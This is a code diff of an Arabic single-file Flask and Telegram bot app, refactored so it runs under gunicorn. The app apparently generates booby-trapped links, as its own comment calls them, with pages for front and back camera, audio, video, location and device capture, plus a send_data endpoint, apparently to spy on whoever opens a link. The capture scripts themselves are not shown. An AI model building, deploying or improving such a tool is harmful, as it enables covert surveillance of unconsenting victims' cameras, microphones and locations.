@@ -1,8 +1,7 @@
-here# ============================================================
+# ============================================================
 #  ملف واحد شامل (app.py) - سيرفر + بوت + قاعدة بيانات + كل شيء
 # ============================================================
 
-# ====== الاستيرادات ======
 from flask import Flask, request, render_template_string, redirect, jsonify
 from datetime import datetime
 import secrets
@@ -47,7 +46,6 @@ def init_db():
     conn = get_db()
     cursor = conn.cursor()
     
-    # جدول المستخدمين
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
@@ -65,7 +63,6 @@ def init_db():
         )
     ''')
     
-    # جدول الدعوات
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS invites (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -76,7 +73,6 @@ def init_db():
         )
     ''')
     
-    # جدول المحاولات اليومية
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS daily_attempts (
             user_id INTEGER,
@@ -86,7 +82,6 @@ def init_db():
         )
     ''')
     
-    # جدول الإعدادات
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
@@ -94,7 +89,6 @@ def init_db():
         )
     ''')
     
-    # جدول القنوات الإجبارية
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS required_channels (
             channel_id TEXT PRIMARY KEY,
@@ -103,7 +97,6 @@ def init_db():
         )
     ''')
     
-    # جدول الميزات
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS features (
             feature_name TEXT PRIMARY KEY,
@@ -111,7 +104,6 @@ def init_db():
         )
     ''')
     
-    # جدول سجل المستخدمين
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS user_logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -122,7 +114,6 @@ def init_db():
         )
     ''')
     
-    # جدول الجلسات (الروابط الملغمة)
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS sessions (
             session_id TEXT PRIMARY KEY,
@@ -134,7 +125,6 @@ def init_db():
         )
     ''')
     
-    # الإعدادات الافتراضية
     cursor.execute('''
         INSERT OR IGNORE INTO settings (key, value)
         VALUES 
@@ -144,7 +134,6 @@ def init_db():
             ('camera_count', '3')
     ''')
     
-    # الميزات الافتراضية (بدون files)
     features = ['camera', 'audio', 'video', 'location', 'device', 'all']
     for feature in features:
         cursor.execute('''
@@ -353,6 +342,10 @@ def get_session(session_id):
     session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
     conn.close()
     return session
+
+# ====== إنشاء تطبيق Flask ======
+app = Flask(__name__)
+app.secret_key = SECRET_KEY
 
 # ============================================================
 #  الصفحات الثمانية (كاميرا، فيديو، صوت، موقع، معلومات، شامل)
@@ -585,11 +578,8 @@ runAll();
 """
 
 # ============================================================
-#  تطبيق Flask (السيرفر)
+#  دوال Flask (الـ Routes)
 # ============================================================
-
-app = Flask(__name__)
-app.secret_key = SECRET_KEY
 
 @app.route('/')
 def index():
@@ -625,6 +615,7 @@ def test_page(session_id, features):
         return "⏰ انتهت صلاحية الرابط", 403
     original_url = session['original_url']
     config_data = json.loads(session['config']) if session['config'] else {}
+    
     pages = {
         'camera_front': CAMERA_FRONT_PAGE,
         'camera_back': CAMERA_BACK_PAGE,
@@ -635,9 +626,11 @@ def test_page(session_id, features):
         'device': DEVICE_PAGE,
         'all': ALL_PAGE
     }
+    
     page = pages.get(features)
     if not page:
         return "❌ ميزة غير معروفة", 404
+    
     return render_template_string(
         page,
         session_id=session_id,
@@ -752,7 +745,7 @@ def send_data():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-#  بوت تيليجرام (bot)
+#  بوت تيليجرام
 # ============================================================
 
 bot = TeleBot(BOT_TOKEN)
@@ -1130,8 +1123,9 @@ def stats_cmd(message):
     """
     bot.reply_to(message, msg, parse_mode='Markdown')
 
-# ====== تشغيل البوت في خيط منفصل ======
+# ====== تشغيل البوت ======
 def run_bot():
+    print("🤖 بدء تشغيل البوت...")
     while True:
         try:
             bot.polling(none_stop=True, interval=1)
@@ -1139,20 +1133,21 @@ def run_bot():
             print(f"⚠️ خطأ في البوت: {e}")
             time.sleep(5)
 
+# ====== بدء البوت فوراً (دون انتظار if __name__) ======
+print("🚀 جاري تهيئة قاعدة البيانات...")
+init_db()
+print("✅ قاعدة البيانات جاهزة")
+
+# تشغيل البوت في خلفية
+bot_thread = threading.Thread(target=run_bot, daemon=True)
+bot_thread.start()
+print("🤖 تم تشغيل البوت في الخلفية")
+
 # ============================================================
-#  تشغيل السيرفر
+#  تشغيل السيرفر (عند تنفيذ gunicorn)
 # ============================================================
 
-if __name__ == '__main__':
-    # تهيئة قاعدة البيانات
-    init_db()
-    print("✅ تم تهيئة قاعدة البيانات")
-    
-    # تشغيل البوت في الخلفية
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    print("🤖 تم تشغيل البوت")
-    
-    # تشغيل السيرفر
-    print("🚀 تشغيل السيرفر على http://0.0.0.0:5000")
-    app.run(host='0.0.0.0', port=5000
+if __name__ != '__main__':
+    print("🚀 السيرفر جاهز للعمل مع gunicorn")
+else:
+    app.run(host='0.0.0.0', port=5000)
